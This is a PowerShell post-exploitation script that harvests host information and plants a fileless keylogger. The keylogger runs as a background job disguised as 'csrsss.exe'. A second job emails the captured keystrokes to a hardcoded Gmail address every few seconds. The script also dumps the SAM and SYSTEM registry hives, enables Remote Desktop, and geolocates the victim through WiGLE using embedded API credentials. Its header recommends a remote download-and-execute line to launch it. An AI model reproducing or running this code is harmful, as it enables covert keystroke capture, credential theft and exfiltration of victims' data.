#############################################################################################################
###																										                                                                             ###
### 		Information scrapper : Post exploitation information scrapper  powershell script			                 ###	
###																										                                                                             ###		
### 		By AXANO																					                                                                       ###	
###																										                                                                             ###
#############################################################################################################

<#

.SYNOPSIS
Powershell script that 
	Gathers info
	Plants a fileless kelyogger
	Finds the geolocation of the client through querrying the AP name in the Wiggle database
	Sends all info through email back

FIRST RUN "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
########## OR #############
USE 
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')

.USEFUL	
### Measures time needed to execute certain command
Measure-Command { commandToExecute }
### Command to wipe the "downloaded form the internet" flag of a file
Unblock-File c:\downloads\file.zip

.TODO
###check if user is in administrator group, if true and script inst run as admin try UAC bypass
https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-local-admins-group-on-a-remote-server
### TODO add startup  script
### hide keylogger produced file and change the name

#>

### Add information to resultsgithub
function Main(){
#$results = "RESULTS `n"
#initialize
#$results = nonAdministrativeScrapperFunctions
### Runs Key logger (does not require admin privs)
#$results += keyLogger
#$results += findGeoLocation
#mail $results
createMailerToMailKeyloggerResults
}

function debug(){
$hello = "Hello World"
$hello | Out-File .\debug.txt
}

### SMTP mailing tool
### Sends a mail using a free smtp server
### $messageBody is send as message body in the mail
function mail($messageBody){

$smtpServer = "smtp.scarlet.be"

 #Creating a Mail object
 $msg = new-object Net.Mail.MailMessage

 #Creating SMTP server object
 $smtp = new-object Net.Mail.SmtpClient($smtpServer)
 $smtp.Enablessl = $true
 $smtp.port = 25
 #Email structure 
 ### !!!! From email can be spoofed
 ### On 12/09/2018 you could still use any gmail account as sender and receiver (TESTED)
 $msg.From = "powershell@scarlet.be"
 $msg.To.Add("perselis.e@gmail.com")

 $msg.subject = "Scrapper information"


 $msg.IsBodyHTML = $false
 $msg.body = $messageBody +""

 $ok=$true 
 Write-Host "SMTP Server:" $smtpserver "Port #:" $smtp.port "SSL Enabled?" $smtp.Enablessl
 try{
        $smtp.Send($msg)
        Write-Host "SENT"

 }
 catch {
    $error[0]
    $_.Exception.Response
    $ok=$false
 }
 finally{
    $msg.Dispose()

 }
 if($ok){
    Write-Host "EVERYTHING PASSED"
 }

}

function initialize(){
### Changes the window title
$host.ui.RawUI.WindowTitle = "Information scrapper"
}

function nonAdministrativeScrapperFunctions(){
$results = "Start of non Administrative Scrapper Functions`n"
$results += "`n"
### Get current date
$results += "`nCurrent Date `n"
$results += [System.DateTime]::Now
$results += "`n"
# or
# Get-Date
### Get execution policy to see if running a script is possible
$results += "`nExecution policy`n"
$results += Get-ExecutionPolicy 
$results += "`n"

<#
NOT NEEDED, systeminfo GATHERS THIS INFORMATION
### Get OS version
[Environment]::OSVersion
### Get OS type (home/pro/enterprise)
(Get-WmiObject -class Win32_OperatingSystem).Caption
#>

### Detailed system info
$results += "`nDetailed system info `n"
$results += systeminfo | Format-Table -HideTableHeaders | Out-String
$results += "`n"

### Gets public ip
$results += "`nPublic IP `n"
### WORKS ONLY FOR PSv5
#$results += Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
### PSv2 alternative
$results += (New-Object Net.WebClient).DownloadString('http://ipecho.net/plain')
$results += "`n"

### Gets active tcp connections
$results += "`nActive TCP connections `n"
### WORKS ONLY FOR PSv5
# $results += Get-NetTCPConnection | Format-Table -HideTableHeaders | Out-String
### PSv2 alternative
$results += netstat -an | Format-Table -HideTableHeaders | Out-String
$results += "`n"

### Gets contents of clipboard
$results += "`nClipboard content`n"
### WORKS ONLY ON PSv5
#$results += Get-Clipboard
### PSv2 alternative
$results += add-type -as System.Windows.Forms; [windows.forms.clipboard]::GetText()
$results += "`n"

### Gets information of installation settings
$results += "`nInstallation settings info `n"
$results += Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion | Out-String
$results += "`n"

### Detects if powershell is run as administrator
$results += "`nIs powershell run as admin? `n"
$results += [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
$results += "`n"

### Lists recently opened files
$results += "`nRecently opened files `n"
$results += dir $HOME"\AppData\Roaming\Microsoft\Windows\Recent\" | Format-Table -HideTableHeaders | Out-String
$results += "`n"

### Gets BIOS info (can be used to find out if a machine runs in a virtual environment)
$results += "`nBIOS info `n"
$results += Get-WmiObject win32_bios | Format-Table -HideTableHeaders | Out-String
$results += "`n"

### Gets  name, status, SID, Lastlogon of all local users
$results += "`nLocal users info `n"
### Powershell v2 incompatible!!!
#$results += Get-LocalUser | Select-Object Name,Enabled,SID,Lastlogon | Format-Table -HideTableHeaders | Out-String 
### PSv2 alternative
$results += net user $env:UserName | Format-Table -HideTableHeaders | Out-String
$results += "`n"

### Checks if computer is in domain
$results += "`nIs computer in a domain?`n"
if ((gwmi win32_computersystem).partofdomain -eq $true) {
    $results += "I am domain joined!"
} else {
    $results += "Ooops, workgroup!"
}
$results += "`n"

### Gets all running processes with details
$results += "`nAll running processes`n"
$results +=  Get-Process | Format-Table -HideTableHeaders | Out-String
$results += "`n"

### Slow but more detailed alternative (not needed if results will be stored in variable)
# Get-Process | format-list *

### Gets all environment variables
$results += "`nEnvironment variables`n"
$results +=  Get-ChildItem env: | Format-Table -HideTableHeaders | Out-String
$results += "`n"

return $results
}


function administrativeScrapperFunctions(){
### Dump sam (needs administrator rights)
reg save HKLM\SAM .\sam

### Dump system (needs administrator rights)
reg save HKLM\SYSTEM .\system

### Enables remoting, windows will listen on certain ports for incoming connections
### TO connect enter "Enter-PSSession COMPUTER_NAME"
### may need to provide credentials through -Cred parameter
# needs to be tested!!!!
Set-NetConnectionProfile -NetworkCategory Private -Force -SkipNetworkProfileCheck

### Enable remote Desktop
$regKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server"
Set-ItemProperty $regKey fDenyTSConnections 0
}



### Function that creates a power shell file 
### with the key loggers source in it and runs it in background
### TESTED ON windows10 and windows 7(powershell v2)
### IF log file already exists, it appends results
### TODO add a process that periodically sends the updated log file through email
function keyLogger(){
$scriptForKeyloggerAsString = 'Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private const string logFileName = @"%TEMP%\keylogger.txt";
    private static StreamWriter logFile;

    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;

    public static void Main() {
	  string expandedFileName = Environment.ExpandEnvironmentVariables(logFileName);
      logFile = File.AppendText(expandedFileName);
      logFile.AutoFlush = true;

      hookId = SetHook(hookProc);
      Application.Run();
      UnhookWindowsHookEx(hookId);
    }

    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        int vkCode = Marshal.ReadInt32(lParam);
        logFile.Write((Keys)vkCode);
      }

      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
  }
}
"@ -ReferencedAssemblies System.Windows.Forms
[KeyLogger.Program]::Main();
'
### WORKING ###
#Invoke-Expression $scriptForKeyloggerAsString
### THIS WAS A HELL TO FIND BUT IT WORKS!!!
$command = '$scriptBlockVar ='+$scriptForKeyloggerAsString+'
 Invoke-Expression $scriptBlockVar'
$scriptBlock = [scriptblock]::Create($command)
### Starts script block in background and saves job as variable
### Job is started as a different process unrelated to this script process
### and is not killed if current window is killed.
$job = start-Job -scriptblock $scriptBlock -Name "csrsss.exe"
### Sleeps 1 second to be sure that job is properly started.
Sleep 1
### Checks if keylogger is running
$results += "`nKeylogger status. `n"
if($job.state -eq "Running"){
	
	$results += "Keylogger is Running..."
}else {
	$results +="Keylogger is NOT running"
}
$results += "`n"
return $results
### DEBUG
#$job | Format-List -Property *
}


### Finds geolocation by searching the WIGLE database with the current SSID and the BSSID of the current connected AP
# This function uses an authentication token given by WIGLE.
# API docs can be found here : https://api.wigle.net/swagger#/Network%20search%20and%20information%20tools/search_1
# TODO add try catch to filter pc's with no wireless connection
# TODO catch when pc has 2 or more w-nic
# There is a daily query limit ~5 requests
function findGeoLocation(){
	Try{
	# Gets current AP 
	$strDump = netsh wlan show interfaces
	# PARSING....
	$objInterface = "" | Select-Object SSID,BSSID

	foreach ($strLine in $strDump) {
		if ($strLine -match "^\s+SSID") {
			$objInterface.SSID = $strLine -Replace "^\s+SSID\s+:\s+",""
		} elseif ($strLine -match "^\s+BSSID") {
			$objInterface.BSSID = $strLine -Replace "^\s+BSSID\s+:\s+",""
		}
	}
	
	#Variable isolation
	$SSID = $objInterface.SSID
	$BSSID = $objInterface.BSSID


	# Building the final URI
	$uri = "https://api.wigle.net/api/v2/network/search?onlymine=false&first=0&freenet=false&paynet=false&netid="+$BSSID+"&ssid="+$SSID
	# Auth tokens
	$user = 'AIDeeed5624aa547065e149f4c3067b8a26'
	$pass = '4146a9f04324cc281439e23da8ec5686'
	# Creating pair used for encoding 
	$pair = "$($user):$($pass)"

	$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))

	$basicAuthValue = "Basic $encodedCreds"
	# Building headers
	$Headers = @{
		Authorization = $basicAuthValue
	}
	# Making actual request
	$response = Invoke-RestMethod -Uri $uri -Headers $Headers
	$response
	$response.results
		}
		Catch{
		return "Geolocation failed. Pc is probably not connected to a WAP..."
		}
}

### Creates a background process that will send a mail with the keyloggers results every 5 mins
### It also checks whether the file exists if not it exits
function createMailerToMailKeyloggerResults(){
	$variableContainingScriptToBeExecutedAsString = '
function mail($messageBody){
		$smtpServer = "smtp.scarlet.be"
		 #Creating a Mail object
		 $msg = new-object Net.Mail.MailMessage

		 #Creating SMTP server object
		 $smtp = new-object Net.Mail.SmtpClient($smtpServer)
		 $smtp.Enablessl = $true
		 $smtp.port = 25
		 #Email structure 
		 ### !!!! From email can be spoofed
		 ### On 12/09/2018 you could still use any gmail account as sender and receiver (TESTED)
		 $msg.From = "powershell@scarlet.be"
		 $msg.To.Add("perselis.e@gmail.com")

		 $msg.subject = "Scrapper information"


		 $msg.IsBodyHTML = $false
		 $msg.body = $messageBody +""

		 $ok=$true 
		 Write-Host "SMTP Server:" $smtpserver "Port #:" $smtp.port "SSL Enabled?" $smtp.Enablessl
		 try{
				$smtp.Send($msg)
				Write-Host "SENT"

		 }
		 catch {
			$error[0]
			$_.Exception.Response
			$ok=$false
		 }
		 finally{
			$msg.Dispose()

		 }
		 if($ok){
			Write-Host "EVERYTHING PASSED"
		 }

	}
	
	$keyloggerLogFilePath = $env:temp+"\keylogger.txt"
	while($true)
	{
		Sleep (5 * 1)
		try{
			$keyloggerJob = Get-Job -Name "csrsss.exe"
			if($keyloggerJob.State -eq "Running"){
				if([System.IO.File]::Exists($keyloggerLogFilePath)){
					$keyloggerFileContents = type $keyloggerLogFilePath
					mail $keyloggerFileContents
				}
				else{
					"Keylogger log does not exist"
					mail "Keylogger log does not exist"
					exit
				}
				
			}else{
				"Keylogger is not running"
				mail "Keylogger is not running see email headers for more details"
				exit
			}
			
		}
		catch{
			"Keylogger is not running"
			mail "Keylogger is not running see email headers for more details"
			exit
		}
	}
	'
	$command = '$scriptBlockVar ='+$variableContainingScriptToBeExecutedAsString+'
	Invoke-Expression $scriptBlockVar'
	$scriptBlock = [scriptblock]::Create($command)
	### Starts script block in background and saves job as variable
	### Job is started as a different process unrelated to this script process
	### and is not killed if current window is killed.
	$job = start-Job -scriptblock $scriptBlock -Name "mailer.exe"
	Sleep 1
	### Checks if mailer is running
	$results += "`nMailer status. `n"
	if($job.state -eq "Running"){
		$results += "Mailer is Running..."
	}else {
		$results +="Mailer is NOT running"
	}
	$results += "`n"
	$results
}

### Strict mode is scoped.
### It prevents minor scripting errors like accessing non existent variables
Set-StrictMode -Version Latest

### Calling Main
. Main
